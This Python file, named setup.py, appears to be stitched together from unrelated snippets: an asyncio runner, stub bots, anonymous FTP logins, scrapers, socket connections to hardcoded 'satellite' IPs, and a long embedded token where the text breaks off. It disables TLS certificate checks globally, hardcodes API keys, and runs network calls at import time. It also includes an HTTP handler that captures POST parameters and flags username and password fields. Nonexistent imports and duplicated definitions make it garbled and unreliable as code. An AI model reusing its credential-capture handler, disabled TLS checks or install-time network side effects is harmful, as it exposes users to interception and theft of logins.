#!/usr/bin/env python3
# -*- coding: utf-8 -*-                                # ==============================================================================
# File:         setup.py                        
# Author:       RAFAEL TAVARES
# Created:      10/25/2025  
# Revised:      github.com
# Depends:      n/a                                    # Compat:       3.7+
#
#-[ Usage ]---------------------------------------------------------------------
#
#
# - https://ftputil.sschwarzer.net/documentation
#       - file content is always transferred in binary mode for upload/downloads
#                                                      # - Help: https://stackoverflow.com/questions/31828604/unable-to-download-files-using-ftputil
#
# ==============================================================================
from __future__ import annotations
import json 
import os
import hashlib
import sock
import re
import requests
import urllib
import sqlite3
import login
import hashlib
import urllib.request
import shlex
import ftplib
import math
import bot
import shutil
import urllib.parse
import subprocess
import random
import string
import time
import hashlib
import time
import _thread
import uuid
import sys
import re
import binascii
from io import open
import os
import msal
import js2py
import socket 
import platform
from io import BytesIO
import pickle
import sys
from dataclasses import dataclass
import discord
from bs4 import BeautifulSoup
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from urllib3 import PoolManager
from firebase_admin import auth, initialize_app
from discord.ext import commands
from ftplib import FTP
from javascript import require, globalThis
from kivy.uix.screenmanager import Screen
from flask import request
from kivy.uix.screenmanager import Screen, ScreenManager
from flask import Flask, redirect
from firebase_token_generator import create_token as AppStore
from kivy.metrics import dp
from datetime import datetime
from typing import Literal, Optional
from pathlib import Path
from cloudflare import Cloudflare
from kivymd.tools.packaging.pyinstaller import hooks_path
from kivy.uix.modalview import ModalView
from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.clock import Clock
from kivymd import kivy
from kivy.metrics import dp
from datetime import datetime
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from flask import Flask, request
from pathlib import Path 
from http.server import HTTPServer, BaseHTTPRequestHandler
from briefcase.exceptions import BriefcaseCommandError
from briefcase.config import PEP508_NAME_RE
from briefcase.integrations.base import ManagedTool, ToolCache
from briefcase.integrations.java import JDK
from briefcase.integrations.subprocess import SubprocessArgT
from briefcase.commands.base import BriefcaseCommandError as AppStore
from briefcase.console import InputDisabled
import pygame
import urllib.parse
import requests
import logging
import configparser
import argparse
import feedparser
import webbrowser
import requests
import csv
import urllib3
import importlib
import tools
from urllib import parse
from plyer import notification
from bs4 import BeautifulSoup
from plyer.utils import platform
from kivymd import kivy
from mapbox import Static
import matplotlib.pyplot as plt
from PIL import Image
import kivymd.factory_registers
import getpass
import xml.etree.ElementTree as ET
import csv
import ssl
import io
import contextvars
import javascript
import enum
import main
import base64
import functools
import socket
import pyfiglet
import threading
import signal
import asyncio  # Assuming asyncio is imported for the sake of this example
importlib.reload(tools)
__all__ = ('Runner', 'run')
class _State(enum.Enum):
    CREATED = "created"
    INITIALIZED = "initialized"
    CLOSED = "closed"

class Runner:
    """A context manager that controls event loop life cycle.
    
    The context manager creates a new event loop,
    allows running async functions inside it, and properly
    finalizes the loop at the context manager exit.
    
    If debug is True, the event loop runs in debug mode.
    If loop_factory is passed, it is used for new event loop creation.
    
    Example usage:
        async def main():
            await asyncio.sleep(1)
            print('hello')

        asyncio.run(main())
    """

    def __init__(self, *, debug=None, loop_factory=None):
        self._state = _State.CREATED
        self._debug = debug
        self._loop_factory = loop_factory
        self._loop = None
        self._context = None
        self._interrupt_count = 0
        self._set_event_loop = False

    def __enter__(self):
        self._lazy_init()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()

    def close(self):
        """Shutdown and close event loop."""
        if self._state is not _State.INITIALIZED:
            return
        try:
            loop = self._loop
            asyncio.all_tasks(loop).cancel()  # Cancel all tasks
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.run_until_complete(loop.shutdown_default_executor())
        finally:
            if self._set_event_loop:
                asyncio.set_event_loop(None)
            loop.close()
            self._loop = None
            self._state = _State.CLOSED

    def get_loop(self):
        """Return embedded event loop."""
        self._lazy_init()
        return self._loop

    def run(self, coro, *, context=None):
        """Run a coroutine inside the embedded event loop."""
        if not asyncio.iscoroutine(coro):
            raise ValueError("a coroutine was expected, got {!r}".format(coro))
        if asyncio.get_running_loop() is not None:
            raise RuntimeError("Runner.run() cannot be called from a running event loop")
        
        self._lazy_init()
        if context is None:
            context = self._context
        task = self._loop.create_task(coro, context=context)
        
        self._interrupt_count = 0
        try:
            return self._loop.run_until_complete(task)
        except asyncio.CancelledError:
            raise  # Reraise CancelledError

    def _lazy_init(self):
        if self._state is _State.CLOSED:
            raise RuntimeError("Runner is closed")
        if self._state is _State.INITIALIZED:
            return
        if self._loop_factory is None:
            self._loop = asyncio.new_event_loop()
        else:
            self._loop = self._loop_factory()
        if self._debug is not None:
            self._loop.set_debug(self._debug)
        self._context = contextvars.copy_context()
        self._state = _State.INITIALIZED
def run(main, *, debug=None, loop_factory=None):
    """
    Execute the coroutine and return the result.

    This function runs the passed coroutine, managing the asyncio event loop.
    It cannot be called when another asyncio event loop is running in the same thread.

    Example:
        async def main():
            await asyncio.sleep(1)
            print('hello')
        run(main)
    """
    
    if asyncio.get_running_loop() is not None:
        print("There is a running event loop.")
        raise RuntimeError("asyncio.run() cannot be called from a running event loop")

    with Runner(debug=debug, loop_factory=loop_factory) as runner:
        return runner.run(main)
PY3 = sys.version_info >= (3, 0)
if hasattr(ssl, "_create_unverified_context"):
    ssl._create_default_https_context = ssl._create_unverified_context
DOH_SERVER = "https://cloudflare-dns.com/dns-query"

class Bot:
    def chat(self, message):
        print(f"BOT: {message}")

    def walk_forward(self, steps):
        print(f"BOT caminhando para frente {steps} passos.")

    def send_message(self, user_id, message):
        print(f"Enviando mensagem para {user_id}: {message}")

def handle_message(message):
    bot = Bot()
    bot.chat("Verificando diretório raiz do jogo e acionando cache remoto...")
    bot.walk_forward(5)
    bot.send_message(message.sender.id, "Clique aqui: https://chatgpt.com/")

class Brain:
    def get_response(self, text):
        print(f"Brain response to: {text}")

class BrainTrain(Brain):
    def train_by_portugues_corpus(self):
        print("Training with Portuguese corpus...")

    def train_by_some_exemples(self):
        print("Training with some examples...")

    def train_by_data_from_database(self):
        print("Training with data from database...")

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else ''
    
    if mode == 'learn':
        print("Initializing learn mode")
        alex = BrainTrain()
        alex.train_by_portugues_corpus()
        alex.train_by_some_exemples()
        alex.train_by_data_from_database()
    else:
        alex = Brain()
        while True:
            user_input = input("User - ")
            alex.get_response(user_input)

class Message:
    class Sender:
        def __init__(self, sender_id):
            self.id = sender_id
    
    def __init__(self, sender_id, text):
        self.sender = self.Sender(sender_id)
        self.text = text
def create_robots_txt():
    with open("robots.txt", "w") as file:
        file.write("User-agent: *\n")
        file.write("Disallow: /admin/\n")
        file.write("Disallow: /login/\n")
        file.write("Allow: /\n")
        file.write("Sitemap: https://ngrok-docs.vercel.app/docs/sitemap.xml\n")

    print("Arquivo robots.txt criado com sucesso!")

# Exemplo de uma mensagem simples
@dataclass
class Message:
    sender_id: str
    text: str

msg = Message(sender_id="3056416804", text="Olá, bot!")

# Chamando a função para criar o arquivo
create_robots_txt()
def webhook():
    data = request.get_json()
    if data and 'message' in data:
        print(f"Received message: {data['message']}")
    return 'OK', 200

class AppStoreScraper:
    def __init__(self, app_id, country="br"):
        self.app_id = app_id
        self.country = country
    
    def fetch_reviews(self):
        return []

def fetch_reviews_from_db(database_path):
    try:
        conn = sqlite3.connect(database_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM reviews")
        reviews = cursor.fetchall()
        conn.close()
        return reviews
    except sqlite3.Error as e:
        print(f"Erro no banco de dados: {e}")
        return []

scraper = AppStoreScraper(app_id=431946152)
database_path = "reviews.db"
reviews = fetch_reviews_from_db(database_path)

if reviews:
    for review in reviews[:3]:
        print(review)

def connect_ftp(host, username, password):
    ftp = FTP(host)
    ftp.login(user=username, passwd=password)
    print(f"Conectado ao servidor: {host}")
    return ftp

# Configurações dos servidores FTP
ftp1_host = "ftp.perl.org"
ftp2_host = "ftp.ga.gov.au"
ftp3_host = "ftp.belnet.be"
ftp4_host = "ftp-nyc.osuosl.org"
username = "anonymous"
password = "ashley"

# Conectando aos quatro servidores FTP
ftp1 = connect_ftp(ftp1_host, username, password)
ftp2 = connect_ftp(ftp2_host, username, password)
ftp3 = connect_ftp(ftp3_host, username, password)
ftp4 = connect_ftp(ftp4_host, username, password)

# Fechando as conexões
ftp1.quit()
ftp2.quit()
ftp3.quit()
ftp4.quit()
def varrer_website(url):
    # Cria uma sessão do requests
    session = requests.Session()
    
    # Configura o Retry com allowed_methods
    retry = Retry(allowed_methods=["GET", "POST"], total=3, backoff_factor=1)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # Envia uma requisição GET para o website
    response = session.get(url)
    
    # Verifica se a requisição foi bem-sucedida
    if response.status_code == 200:
        # Usa BeautifulSoup para analisar o conteúdo HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Exemplo: Obtém o título do site
        titulo = soup.title.string if soup.title else "Sem título"
        
        # Exemplo: Obtém a meta descrição
        meta_desc = soup.find('meta', attrs={'name': 'description'})
        descricao = meta_desc['content'] if meta_desc else "Sem descrição"
        
        # Exemplo: Obtém todos os links da página
        links = [a['href'] for a in soup.find_all('a', href=True)]
        
        # Exibe as informações coletadas
        print(f"Título: {titulo}")
        print(f"Descrição: {descricao}")
        print(f"Links encontrados:")
        for link in links:
            print(link)
    else:
        print(f"Erro ao acessar {url}, código de status: {response.status_code}")

url = 'https://www.roblox.com'  # Substitua pelo URL que deseja analisar
varrer_website(url)
def carregar_json(resposta):
    """Tenta carregar um JSON a partir de uma resposta fornecida."""
    if not isinstance(resposta, str) or not resposta.strip():
        print("Erro: A resposta está vazia ou não é uma string válida.")
        return {}
    
    try:
        dados = json.loads(resposta)
        return dados
    except json.JSONDecodeError as e:
        print(f"Erro ao decodificar JSON: {e}")
        return {}

def connect_to_satellite(ip, ports):
    """Função para conectar a um satélite via TCP/IP em múltiplas portas e enviar um comando."""
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)  # Define um tempo limite de 5 segundos
                print(f"Conectando ao satélite {ip}:{port}...")
                s.connect((ip, port))
                print(f"Conexão estabelecida na porta {port}!")

                command = "STATUS\n"
                s.sendall(command.encode())
                print(f"Comando enviado: {command.strip()}")

                response = s.recv(1024).decode()
                print(f"Resposta do satélite na porta {port}: {response}")

        except socket.timeout:
            print(f"Conexão ao satélite na porta {port} excedeu o tempo limite.")
        except Exception as e:
            print(f"Erro ao conectar ao satélite na porta {port}: {e}")
def fetch_url(url):
    
    http = urllib3.PoolManager()

    response = http.request("GET", url, preload_content=False)

    print(f"Status: {response.status}")

    print(response.data[:200]) 

    response.release_conn()

fetch_url("https://www.starlink.com/")

def conectar_servidor(host, porta):
    """Conecta a um servidor TCP e envia uma mensagem."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, porta))
            print(f"Conectado a {host}:{porta}")

            mensagem = "Olá, servidor!"
            s.sendall(mensagem.encode())

            resposta = s.recv(1024).decode()
            print(f"Resposta do servidor: {resposta}")

        except ConnectionRefusedError:
            print(f"Falha ao conectar a {host}:{porta} (Conexão recusada)")
        except Exception as e:
            print(f"Erro ao conectar a {host}:{porta}: {e}")
def fetch_url(url):
    # Cria um PoolManager
    http = PoolManager()

    try:
        # Tenta fazer a requisição GET
        response = http.request('GET', url)
        return response.status  # Retorna o status da resposta
    except urllib3.exceptions.RequestError as e:
        print(f"Erro ocorrido: {e}")
        return None  # Retorna None em caso de erro

# Usando a função
url = 'https://www.starlink.com'
status_code = fetch_url(url)
if status_code:
    print(f"Requisição bem-sucedida com status: {status_code}")
else:
    print("Falha na requisição.")
def main():
    # Configurações do satélite (substitua pelos valores reais)
    SATELLITE_IP = "151.101.129.143"  # IP fictício do satélite
    SATELLITE_PORTS = [80]  # Lista de portas

    # Chamando a função para conectar ao satélite
    connect_to_satellite(SATELLITE_IP, SATELLITE_PORTS)

    # Definindo as coordenadas e a data
    longitude = -46.625290  # Exemplo de longitude
    latitude = -23.533773   # Exemplo de latitude
    date = '2025-10-19'     # Formato de data YYYY-MM-DD
    api_key_1 = "dCMllHNj3NTcxNTU2NDEsIm9yaWdpbiI6Imh0dHBzOi8vc2F0ZWxsaXRlcy5wcm8ifQ.TQRfj1QKXWHMDHPNErlzD2DoQrZTLVvN"  # Substitua pela sua chave de API do primeiro site
    api_key_2 = "ceb8ab75da308ea820546375e9230dd9"  # Substitua pela sua chave de API do segundo site

    # URLs das APIs
    url_1 = 'https://www.starlink.com'  # Substitua pela URL real do primeiro site
    url_2 = 'https://satellite-map.gosur.com'  # Substitua pela URL real do segundo site

    # Verifica se as coordenadas estão definidas
    if longitude is not None and latitude is not None:
        print(f"A localização é: Longitude = {longitude}, Latitude = {latitude}")
        
        # Acessa dados do primeiro site
        print("Acessando dados do primeiro site...")
        satellite_data_1 = get_satellite_data(url_1, longitude, latitude, date, api_key_1)
        print(satellite_data_1)

        # Acessa dados do segundo site
        print("Acessando dados do segundo site...")
        satellite_data_2 = get_satellite_data(url_2, longitude, latitude, date, api_key_2)
        print(satellite_data_2)
    else:
        print("As coordenadas não foram definidas.")

    # Conectar a um servidor TCP
    hosts = [{"host": "44.237.78.176", "porta": 7000}]
    for servidor in hosts:
        conectar_servidor(servidor["host"], servidor["porta"])
# Nome do arquivo de configuração
# Criando uma instância para o app Roblox na App Store brasileira
# Exibindo algumas informações
# Function to process the 'message' from the webhook payload
def handle_message(message):
    print(f"Received message: {message}")
    # Example: Send a DNS request to the DoH server (as a placeholder action)
    try:
        # Perform a DNS-over-HTTPS request
        response = requests.get(DOH_SERVER, params={
            'ip': '157.240.229.35',
            'dns':  'd.ns.facebook.com',
            'type': 'A'
        })
        dns_data = response.json()
        print("DNS Response:", dns_data)
    except requests.exceptions.RequestException as e:
        print(f"Error during DoH request: {e}")

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse the data sent in the POST request
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Parse the POST data as URL-encoded parameters
        params = urllib.parse.parse_qs(post_data)

        print("\n[+] Captured Parameters:")
        for key, value in params.items():
            print(f"PARAM: {key}={value[0]}")
            
            # Identifying possible sensitive fields
            if "user" in key.lower():
                print(f"[!] POSSIBLE USERNAME FIELD FOUND: {key}={value[0]}")
            if "password" in key.lower() or "spin" in key.lower():
                print(f"[!] POSSIBLE PASSWORD FIELD FOUND: {key}={value[0]}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received.")
def iniciar_bot():
    """Função para iniciar o bot."""
    intents = discord.Intents.default()  # Definir intents padrões
    intents.message_content = True  # Habilita a leitura de mensagens

    bot = discord.Client(intents=intents)  # Passa os intents ao criar o bot

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')
        print("Resposta encontrada.")

    token = os.getenv('''eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.ew0KICAiY2VydGlmaWNhdGVDaGFpbnMiOiBbDQogICAgew0KICAgICAgIm5hbWUiOiAic2t5ZHJpdmUiLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJhMDo3OTo0MjoxNToyNzo4YTo1Njo3ZTo4ODo3YTpmNjpjZDplMDoxNTphNTplODo4NDoxNDplZjo2NDowZjo3ZDphYjozODo1NTphMzplNzo3OTo2NTo4YjplNzo3OCINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInNreWRyaXZlX2NlcnRpZmljYXRlX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYTA6Nzk6NDI6MTU6Mjc6OGE6NTY6N2U6ODg6N2E6ZjY6Y2Q6ZTA6MTU6YTU6ZTg6ODQ6MTQ6ZWY6NjQ6MGY6N2Q6YWI6Mzg6NTU6YTM6ZTc6Nzk6NjU6OGI6ZTc6NzgiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb3V0bG9va19seW5jX2RlZmVuZGVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYjk6MjU6MTM6NmY6M2U6YTc6YzA6YTE6OTU6MTY6OTA6YTE6YWI6MzE6Mzk6MTA6ZGE6ODE6ZjQ6MDk6OTQ6YTg6NTM6NDI6ZWM6NjI6Mjg6ODg6ZjE6Mjg6NzA6NTEiDQogICAgICBdDQogICAgfSwNCgl7DQogICAgICAibmFtZSI6ICJleGNlbF93b3JkX3Bvd2VycG9pbnRfb2ZmaWNlaHVicm93X2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAgIjFmOmI0OmRlOjc2OjBmOjQwOmYzOjBlOjY2OmQzOjA4OjUxOjhhOjFiOmQ5OmQxOjRlOmYxOjQxOjFiOmZmOmE5OmQ2Ojc2OjI4Ojc2OmI2OjAyOjY2OjFkOjU0OmVkIiwNCiAgICAgICAgICI0Yjo4ZjozNDpjOTo3ZTowNTphZTpjZTpiNzo0YzpiNTpjOTo4ZjozNjpmNjoyODo2ZjpkODpiZjo2NDphMjo1NzphYzozYjozMjo1MDoxODpkMDpkZDowOTpjMDo3OSIsDQogICAgICAgICAiNjA6MWE6OTc6MGY6M2Y6MmY6NWU6MjU6NjQ6NjQ6ZjE6NDI6NGY6ZTc6MGQ6Zjg6ODM6NWE6M2E6NGM6YTQ6NDE6YTc6ZjI6ZTg6MDQ6ZTQ6YmU6Njg6MDU6OGQ6OGMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJza3lwZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjdkOjUzOjkzOjUxOmNhOjM5OmMyOjdjOmE3OjA2OjQwOjllOjVhOjliOjZiOjA2OjJkOmI5OmJmOjhkOmMzOmQ4OmNhOmE2OjEzOjcwOjY3OmFlOjdmOjY4OmI1OmU3IiwNCiAgICAgICAgIjZlOmQ1OmEzOjI5OjM1Ojg0OjQ4OjFjOmVhOjVhOjBiOjE3OjRmOmE0OjZhOjg1OmIwOjM5OmI1OmIzOjk4OjkyOjlhOjI2OjRiOjYyOjM0OjI3OmIyOjM3OmQ1OmUzIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAid3VuZGVybGlzdCIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImI1OmIxOmU0OjZkOjVkOjBkOmJmOjk2Ojg4OjMwOjk4OjdlOjkyOjAzOjUwOmNjOmVhOmQ4OjI3OjM2OjA1OjEyOmIzOjFmOmNiOjk4OjdhOjk5OjU5OmExOjVhOjg1Ig0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAic2hpZnRyX2RmIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZjc6YzE6YTc6MDI6ZWE6Mzc6N2M6YjY6ZjM6MzY6NzY6ZjQ6ZTM6Y2Q6YTY6ZDk6MmQ6NjI6OGM6OTE6ZTg6YTU6NDg6Mjk6MTM6NGQ6OTI6ODY6MTI6Yjc6NGE6MDYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjb3J0YW5hX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiODM6NjY6ZmE6Zjc6Mjc6ZGM6NDg6MzE6N2E6MmY6M2E6MGM6Mzc6ZmE6MTI6N2Y6M2Y6MzU6NjE6OTQ6Y2Y6YmI6MmY6NGI6NjI6OGU6Yzc6ZTY6YTE6YTc6NWM6MGYiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJsYXVuY2hlciIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImU4OjQzOmVlOjNkOmExOjE5OjVkOjZhOmZiOjg5OmNhOmEzOmNlOjc0OjI3OmIwOjhmOmMwOjFmOmQ4Ojc4OmEyOjRmOmE1OjZlOjk2OjJjOjM1OmM3OjFkOjVlOjcwIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAibGF1bmNoZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICJlODo0MzplZTozZDphMToxOTo1ZDo2YTpmYjo4OTpjYTphMzpjZTo3NDoyNzpiMDo4ZjpjMDoxZjpkODo3ODphMjo0ZjphNTo2ZTo5NjoyYzozNTpjNzoxZDo1ZTo3MCIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogInBvd2VyYXBwIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiM2Q6MDA6MGQ6OGE6MWU6MjE6NTA6ZGI6Mjg6NWY6OWM6YTg6NmI6OTA6YWQ6NjQ6ODc6ODQ6MGI6YjE6MDQ6OGM6ZDk6Zjc6YjM6NzA6NjY6NTY6MmQ6ZjU6ZWQ6NmMiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nX2NoYWluIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiYWM6NDY6YWI6YTk6MjM6NmU6YmQ6NWE6ZWQ6MzU6OTk6NGU6OWU6ODg6ZWU6NzU6ZDE6ZDY6YjU6MTA6ZTE6ZDU6ZjE6NDE6Yjc6MTk6ZGE6NjI6ZGM6MzU6ODY6ZmEiLA0KICAgICAgICAiYjE6N2U6ODI6MDE6YjE6Mjg6ZTE6ZTc6NGM6YzA6MjM6NTE6MGE6Yjc6ZWE6MDM6YWM6Mjc6ZGQ6ZTU6MGQ6MzI6ZDg6MTA6ZWE6MTU6Nzc6NzU6OGY6MWM6YzA6OTgiLA0KICAgICAgICAiMjg6NDg6MzY6MWE6OWM6MWU6MzI6ZGY6MWQ6M2U6MmU6ZDY6YTc6Yjk6ZTY6N2E6NTI6NWM6Zjg6YTE6M2I6MTY6NGY6ODA6MDY6Yzk6NDc6OTU6Nzg6Zjc6NDY6ZGUiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJjaGVzaGlyZSIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgIjVmOmE1OmU2OmJlOjA2OmQ2OmZiOjk4OjNmOjI2OjJlOmNlOjYxOjM0OmM1OjI2OjA4OjQ1OjBjOmIxOjFkOmMzOjA2OjEyOmY3OjgwOjU5OmQ4OmU3OjY5OmFjOmExIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAiY2hlc2hpcmVfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1ZjphNTplNjpiZTowNjpkNjpmYjo5ODozZjoyNjoyZTpjZTo2MTozNDpjNToyNjowODo0NTowYzpiMToxZDpjMzowNjoxMjpmNzo4MDo1OTpkODplNzo2OTphYzphMSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImJpbmdhcHBzIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiZGI6NjE6YWU6NDQ6NzM6M2U6ZDk6YTE6OTk6ZTU6Mzg6ZTc6YmM6MjM6MTI6YjE6Y2E6MDA6ZDA6ODM6ZDg6MTI6NzY6NWM6MTQ6Zjc6MTM6NjA6MmQ6ZTg6OTQ6YzIiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJiaW5nYXBwc19jaGFpbiIsDQogICAgICAic2lnbmF0dXJlcyI6IFsNCiAgICAgICAgImRiOjYxOmFlOjQ0OjczOjNlOmQ5OmExOjk5OmU1OjM4OmU3OmJjOjIzOjEyOmIxOmNhOjAwOmQwOjgzOmQ4OjEyOjc2OjVjOjE0OmY3OjEzOjYwOjJkOmU4Ojk0OmMyIiwNCiAgICAgICAgImIxOjdlOjgyOjAxOmIxOjI4OmUxOmU3OjRjOmMwOjIzOjUxOjBhOmI3OmVhOjAzOmFjOjI3OmRkOmU1OjBkOjMyOmQ4OjEwOmVhOjE1Ojc3Ojc1OjhmOjFjOmMwOjk4IiwNCiAgICAgICAgIjI4OjQ4OjM2OjFhOjljOjFlOjMyOmRmOjFkOjNlOjJlOmQ2OmE3OmI5OmU2OjdhOjUyOjVjOmY4OmExOjNiOjE2OjRmOjgwOjA2OmM5OjQ3Ojk1Ojc4OmY3OjQ2OmRlIg0KICAgICAgXQ0KICAgIH0sDQogICAgew0KICAgICAgIm5hbWUiOiAieWFtbWVyIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiNTI6NTY6ZmU6YjQ6Zjc6YzU6YWE6Njg6NjE6OWI6OGE6ZjU6NmY6OTg6Njk6MWQ6NTY6OGU6YzA6NDQ6MzU6MDg6YjU6YWI6OGE6MDE6NDg6OTQ6MmU6ZmI6ZTI6MGEiDQogICAgICBdDQogICAgfSwNCiAgICB7DQogICAgICAibmFtZSI6ICJ5YW1tZXJfY2hhaW4iLA0KICAgICAgInNpZ25hdHVyZXMiOiBbDQogICAgICAgICI1Mjo1NjpmZTpiNDpmNzpjNTphYTo2ODo2MTo5Yjo4YTpmNTo2Zjo5ODo2OToxZDo1Njo4ZTpjMDo0NDozNTowODpiNTphYjo4YTowMTo0ODo5NDoyZTpmYjplMjowYSIsDQogICAgICAgICJiMTo3ZTo4MjowMTpiMToyODplMTplNzo0YzpjMDoyMzo1MTowYTpiNzplYTowMzphYzoyNzpkZDplNTowZDozMjpkODoxMDplYToxNTo3Nzo3NTo4ZjoxYzpjMDo5OCIsDQogICAgICAgICIyODo0ODozNjoxYTo5YzoxZTozMjpkZjoxZDozZToyZTpkNjphNzpiOTplNjo3YTo1Mjo1YzpmODphMTozYjoxNjo0Zjo4MDowNjpjOTo0Nzo5NTo3ODpmNzo0NjpkZSINCiAgICAgIF0NCiAgICB9LA0KICAgIHsNCiAgICAgICJuYW1lIjogImNvbm5lY3Rpb25zIiwNCiAgICAgICJzaWduYXR1cmVzIjogWw0KICAgICAgICAiN2I6ZjI6ODU6YWY6YjU6NDM6N2Q6YmI6OTA6ZTA6MTQ6Yjg6ZGQ6ZDQ6Nzc6MGQ6ZTA6Yzc6NGE6NDA6ODM6MmY6M2E6ZTA6NmU6NGE6MGM6NGQ6NDA6NTM6ODI6MzMiDQogICAgICBdDQogICA